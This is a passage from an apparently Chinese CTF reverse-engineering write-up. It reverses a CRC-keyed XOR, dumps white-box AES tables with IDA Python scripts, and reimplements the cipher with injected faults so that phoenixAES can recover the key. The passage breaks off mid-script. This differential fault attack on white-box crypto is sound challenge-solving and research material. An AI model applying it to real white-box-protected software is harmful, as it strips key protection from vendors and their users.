class="keyword">else</span>:</span><br><span class="line">                x &gt;&gt;= <span class="number">1</span></span><br><span class="line">        crc_table[i] = x</span><br><span class="line">    <span class="keyword">return</span> crc_table</span><br><span class="line"></span><br><span class="line">crc_table = init_crc_table()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute_crc</span>(<span class="params">data</span>):</span><br><span class="line">    crc = <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">        crc = (crc &gt;&gt; <span class="number">8</span>) ^ crc_table[(crc ^ byte) &amp; <span class="number">0xFF</span>]</span><br><span class="line">    <span class="keyword">return</span> crc ^ <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">key_crc = compute_crc(<span class="string">b&#x27;love&#x27;</span>[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">invert_sub_37F0</span>(<span class="params">s1, key_crc</span>):</span><br><span class="line">    v5 = <span class="built_in">bytearray</span>(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        shift = <span class="number">8</span> * (i % <span class="number">4</span>)</span><br><span class="line">        v5[i] = s1[i] ^ ((key_crc &gt;&gt; shift) &amp; <span class="number">0xFF</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(v5)</span><br><span class="line"></span><br><span class="line">s = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0BCF797EC7EA5F31BCEEE70B1E91AADD6F07C1103675200632E3D066B87DFC90&quot;</span>))</span><br><span class="line">v5 = invert_sub_37F0(s, key_crc)</span><br><span class="line"><span class="built_in">print</span>(v5.<span class="built_in">hex</span>())    <span class="comment"># df59d8a5137cfeea687846d0ca070b06bb9160cbe2e381dde67571bd6ceb5d4b</span></span><br></pre></td></tr></table></figure>

<p>然后是白盒AES，需要提取密钥，关注到sub_3FD0中的unk_6FA4大小是163840，正好是4<em>10</em>16<em>256，unk_2EFA4大小是4096，正好是16</em>256，结合aes白盒板子要得到tyibox和tbox，idc提取数据填入即可</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数配置</span></span><br><span class="line">base = <span class="number">0x6FA4</span></span><br><span class="line">dim1, dim2, dim3 = <span class="number">10</span>, <span class="number">16</span>, <span class="number">256</span></span><br><span class="line">total_u32 = dim1 * dim2 * dim3</span><br><span class="line">byte_count = total_u32 * <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标输出路径（注意 Windows 路径反斜杠）</span></span><br><span class="line">output_path = <span class="string">r&quot;tyibox.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取内存块</span></span><br><span class="line">data = ida_bytes.get_bytes(base, byte_count)</span><br><span class="line"><span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;读取地址失败！请检查地址是否有效。&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;uint32_t tyibox[10][16][256] = &#123;\n&quot;</span>)</span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim1):</span><br><span class="line">            f.write(<span class="string">&quot;  &#123;\n&quot;</span>)  <span class="comment"># tyibox[i]</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim2):</span><br><span class="line">                f.write(<span class="string">&quot;    &#123;&quot;</span>)</span><br><span class="line">                line = <span class="string">&quot;&quot;</span></span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(dim3):</span><br><span class="line">                    offset = idx * <span class="number">4</span></span><br><span class="line">                    u32val = <span class="built_in">int</span>.from_bytes(data[offset:offset+<span class="number">4</span>], byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">                    line += <span class="string">f&quot;0x<span class="subst">&#123;u32val:08X&#125;</span>, &quot;</span></span><br><span class="line">                    idx += <span class="number">1</span></span><br><span class="line">                <span class="comment"># 去掉结尾多余逗号</span></span><br><span class="line">                line = line.rstrip(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">                f.write(line)</span><br><span class="line">                f.write(<span class="string">&quot;&#125;,\n&quot;</span>)</span><br><span class="line">            f.write(<span class="string">&quot;  &#125;,\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;&#125;;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;导出成功！已写入到: <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">import</span> idc</span><br><span class="line"><span class="keyword">import</span> ida_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># 参数配置</span></span><br><span class="line">base = <span class="number">0x2EFA4</span>  <span class="comment"># 对应 unk_2EFA4</span></span><br><span class="line">dim1, dim2 = <span class="number">16</span>, <span class="number">256</span></span><br><span class="line">total_bytes = dim1 * dim2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出文件路径</span></span><br><span class="line">output_path = <span class="string">r&quot;tbox.txt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取字节数据</span></span><br><span class="line">data = ida_bytes.get_bytes(base, total_bytes)</span><br><span class="line"><span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;读取地址 0x<span class="subst">&#123;base:X&#125;</span> 失败！&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&quot;uint8_t tbox[16][256] = &#123;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim1):</span><br><span class="line">            f.write(<span class="string">&quot;  &#123;&quot;</span>)</span><br><span class="line">            row = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim2):</span><br><span class="line">                val = data[i * dim2 + j]</span><br><span class="line">                row += <span class="string">f&quot;0x<span class="subst">&#123;val:02X&#125;</span>, &quot;</span></span><br><span class="line">            row = row.rstrip(<span class="string">&quot;, &quot;</span>)  <span class="comment"># 去掉最后一个逗号</span></span><br><span class="line">            f.write(row)</span><br><span class="line">            f.write(<span class="string">&quot;&#125;,\n&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;&#125;;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;导出成功，写入到: <span class="subst">&#123;output_path&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;cstdlib&gt;</span></span><br><span class="line"><span class="comment">#include&lt;cmath&gt;</span></span><br><span class="line"><span class="comment">#include&lt;string&gt;</span></span><br><span class="line"><span class="comment">#include&lt;windows.h&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line">typedef unsigned char u8;</span><br><span class="line">typedef unsigned <span class="built_in">int</span> u32;</span><br><span class="line"></span><br><span class="line">u8 gmul(u8 ap, u8 bp) &#123;</span><br><span class="line">  u8 p = <span class="number">0</span>, a = ap, b = bp;</span><br><span class="line">  <span class="keyword">while</span> (a != <span class="number">0</span> &amp;&amp; b != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (b &amp; <span class="number">1</span> != <span class="number">0</span>) p ^= a;</span><br><span class="line">    <span class="keyword">if</span> ((a &amp; <span class="number">0x80</span>) != <span class="number">0</span>)</span><br><span class="line">      a = (a &lt;&lt; <span class="number">1</span>) ^ <span class="number">0x1b</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      a &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> p &amp; <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void shiftRows(u8 state[<span class="number">16</span>]) &#123;</span><br><span class="line">  u8 tmp = state[<span class="number">1</span>];</span><br><span class="line">  state[<span class="number">1</span>] = state[<span class="number">5</span>];</span><br><span class="line">  state[<span class="number">5</span>] = state[<span class="number">9</span>];</span><br><span class="line">  state[<span class="number">9</span>] = state[<span class="number">13</span>];</span><br><span class="line">  state[<span class="number">13</span>] = tmp;</span><br><span class="line">  tmp = state[<span class="number">2</span>];</span><br><span class="line">  state[<span class="number">2</span>] = state[<span class="number">10</span>];</span><br><span class="line">  state[<span class="number">10</span>] = tmp;</span><br><span class="line">  tmp = state[<span class="number">6</span>];</span><br><span class="line">  state[<span class="number">6</span>] = state[<span class="number">14</span>];</span><br><span class="line">  state[<span class="number">14</span>] = tmp;</span><br><span class="line">  tmp = state[<span class="number">15</span>];</span><br><span class="line">  state[<span class="number">15</span>] = state[<span class="number">11</span>];</span><br><span class="line">  state[<span class="number">11</span>] = state[<span class="number">7</span>];</span><br><span class="line">  state[<span class="number">7</span>] = state[<span class="number">3</span>];</span><br><span class="line">  state[<span class="number">3</span>] = tmp;</span><br><span class="line">&#125;</span><br><span class="line">void add_round_shiftkey(u8 state[<span class="number">16</span>], u32 expandedKey[<span class="number">4</span>]) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">      state[i * <span class="number">4</span> + j] ^= (expandedKey[(j + i) % <span class="number">4</span>] &gt;&gt; (<span class="number">24</span> - <span class="number">8</span> * j)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br><span class="line">void add_round_key(u8 state[<span class="number">16</span>], u32 expandedKey[<span class="number">4</span>]) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">      state[i * <span class="number">4</span> + j] ^= (expandedKey[i] &gt;&gt; (<span class="number">24</span> - <span class="number">8</span> * j)) &amp; <span class="number">0xFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void getXorTable(u8 table[<span class="number">16</span>][<span class="number">16</span>]) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++)</span><br><span class="line">      table[i][j] = i ^ j;</span><br><span class="line">&#125;</span><br><span class="line">void getTyiTable(u8 table[<span class="number">4</span>][<span class="number">256</span>][<span class="number">4</span>]) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">    table[<span class="number">0</span>][i][<span class="number">0</span>] = gmul(i, <span class="number">0x02</span>);</span><br><span class="line">    table[<span class="number">0</span>][i][<span class="number">1</span>] = gmul(i, <span class="number">0x03</span>);</span><br><span class="line">    table[<span class="number">0</span>][i][<span class="number">2</span>] = i;</span><br><span class="line">    table[<span class="number">0</span>][i][<span class="number">3</span>] = i;</span><br><span class="line">    table[<span class="number">1</span>][i][<span class="number">0</span>] = i;</span><br><span class="line">    table[<span class="number">1</span>][i][<span class="number">1</span>] = gmul(i, <span class="number">0x02</span>);</span><br><span class="line">    table[<span class="number">1</span>][i][<span class="number">2</span>] = gmul(i, <span class="number">0x03</span>);</span><br><span class="line">    table[<span class="number">1</span>][i][<span class="number">3</span>] = i;</span><br><span class="line">    table[<span class="number">2</span>][i][<span class="number">0</span>] = i;</span><br><span class="line">    table[<span class="number">2</span>][i][<span class="number">1</span>] = i;</span><br><span class="line">    table[<span class="number">2</span>][i][<span class="number">2</span>] = gmul(i, <span class="number">0x02</span>);</span><br><span class="line">    table[<span class="number">2</span>][i][<span class="number">3</span>] = gmul(i, <span class="number">0x03</span>);</span><br><span class="line">    table[<span class="number">3</span>][i][<span class="number">0</span>] = gmul(i, <span class="number">0x03</span>);</span><br><span class="line">    table[<span class="number">3</span>][i][<span class="number">1</span>] = i;</span><br><span class="line">    table[<span class="number">3</span>][i][<span class="number">2</span>] = i;</span><br><span class="line">    table[<span class="number">3</span>][i][<span class="number">3</span>] = gmul(i, <span class="number">0x02</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">void getTyiBox(u8 tbox[<span class="number">10</span>][<span class="number">16</span>][<span class="number">256</span>], u32 tyibox[<span class="number">9</span>][<span class="number">16</span>][<span class="number">256</span>]) &#123;</span><br><span class="line">  u8 tyitable[<span class="number">4</span>][<span class="number">256</span>][<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  getTyiTable(tyitable);</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">int</span> r = <span class="number">0</span>; r &lt; <span class="number">9</span>; r++)</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> x = <span class="number">0</span>; x &lt; <span class="number">256</span>; x++)</span><br><span class="line">      <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">          u32 v0 = tyitable[<span class="number">0</span>][tbox[r][j * <span class="number">4</span> + i][x]][i];</span><br><span class="line">          u32 v1 = tyitable[<span class="number">1</span>][tbox[r][j * <span class="number">4</span> + i][x]][i];</span><br><span class="line">          u32 v2 = tyitable[<span class="number">2</span>][tbox[r][j * <span class="number">4</span> + i][x]][i];</span><br><span class="line">          u32 v3 = tyitable[<span class="number">3</span>][tbox[r][j * <span class="number">4</span> + i][x]][i];</span><br><span class="line">          tyibox[r][j * <span class="number">4</span> + i][x] = (v0 &lt;&lt; <span class="number">24</span>) | (v1 &lt;&lt; <span class="number">16</span>) | (v2 &lt;&lt; <span class="number">8</span>) | v3;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">u32 tyibox[<span class="number">10</span>][<span class="number">16</span>][<span class="number">256</span>] = &#123;...&#125;;    //太长略去</span><br><span class="line"></span><br><span class="line">u8 tbox[<span class="number">16</span>][<span class="number">256</span>] = &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">void aes_encrypt_by_table(u8 <span class="built_in">input</span>[<span class="number">16</span>], <span class="built_in">int</span> isDFA) &#123;</span><br><span class="line"></span><br><span class="line">  u32 a, b, c, d, aa, bb, cc, dd;</span><br><span class="line">  u8 xortable[<span class="number">16</span>][<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">  getXorTable(xortable);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (isDFA &amp;&amp; i == <span class="number">8</span> ) &#123;</span><br><span class="line">      srand(index);</span><br><span class="line">      <span class="built_in">input</span>[index] = rand() % <span class="number">256</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    shiftRows(<span class="built_in">input</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">      a = tyibox[i][<span class="number">4</span> * j + <span class="number">0</span>][<span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">0</span>]];</span><br><span class="line">      b = tyibox[i][<span class="number">4</span> * j + <span class="number">1</span>][<span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">1</span>]];</span><br><span class="line">      c = tyibox[i][<span class="number">4</span> * j + <span class="number">2</span>][<span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">2</span>]];</span><br><span class="line">      d = tyibox[i][<span class="number">4</span> * j + <span class="number">3</span>][<span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">3</span>]];</span><br><span class="line">      aa = xortable[(a &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xf</span>][(b &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      bb = xortable[(c &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xf</span>][(d &gt;&gt; <span class="number">28</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      cc = xortable[(a &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xf</span>][(b &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      dd = xortable[(c &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xf</span>][(d &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      <span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">0</span>] = ((aa ^ bb) &lt;&lt; <span class="number">4</span>) | (cc ^ dd);</span><br><span class="line">      aa = xortable[(a &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xf</span>][(b &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      bb = xortable[(c &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xf</span>][(d &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      cc = xortable[(a &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xf</span>][(b &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      dd = xortable[(c &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xf</span>][(d &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      <span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">1</span>] = ((aa ^ bb) &lt;&lt; <span class="number">4</span>) | (cc ^ dd);</span><br><span class="line">      aa = xortable[(a &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xf</span>][(b &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      bb = xortable[(c &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xf</span>][(d &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      cc = xortable[(a &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xf</span>][(b &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      dd = xortable[(c &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xf</span>][(d &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      <span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">2</span>] = ((aa ^ bb) &lt;&lt; <span class="number">4</span>) | (cc ^ dd);</span><br><span class="line">      aa = xortable[(a &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span>][(b &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      bb = xortable[(c &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span>][(d &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span>];</span><br><span class="line">      cc = xortable[a &amp; <span class="number">0xf</span>][b &amp; <span class="number">0xf</span>];</span><br><span class="line">      dd = xortable[c &amp; <span class="number">0xf</span>][d &amp; <span class="number">0xf</span>];</span><br><span class="line">      <span class="built_in">input</span>[<span class="number">4</span> * j + <span class="number">3</span>] = ((aa ^ bb) &lt;&lt; <span class="number">4</span>) | (cc ^ dd);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  shiftRows(<span class="built_in">input</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">    <span class="built_in">input</span>[j] = tbox[j][<span class="built_in">input</span>[j]];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main() &#123;</span><br><span class="line">  unsigned char input1[<span class="number">17</span>] = &#123;<span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>&#125;;</span><br><span class="line">  aes_encrypt_by_table(input1, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">16</span> ; i ++ ) &#123;</span><br><span class="line">    printf(<span class="string">&quot;%02x&quot;</span>, input1[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  puts(<span class="string">&quot;&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="built_in">int</span> j = <span class="number">0</span> ; j &lt; <span class="number">16</span> ; j ++ ) &#123;</span><br><span class="line">    unsigned char <span class="built_in">input</span>[<span class="number">17</span>] = &#123;<span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x33</span>&#125;;</span><br><span class="line">    aes_encrypt_by_table(<span class="built_in">input</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span> ; i &lt; <span class="number">16</span> ; i ++ ) &#123;</span><br><span class="line">      printf(<span class="string">&quot;%02x&quot;</span>, <span class="built_in">input</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    index++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到故障数据，用phoneixAES生成轮密钥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> phoenixAES</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;tracefile&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span 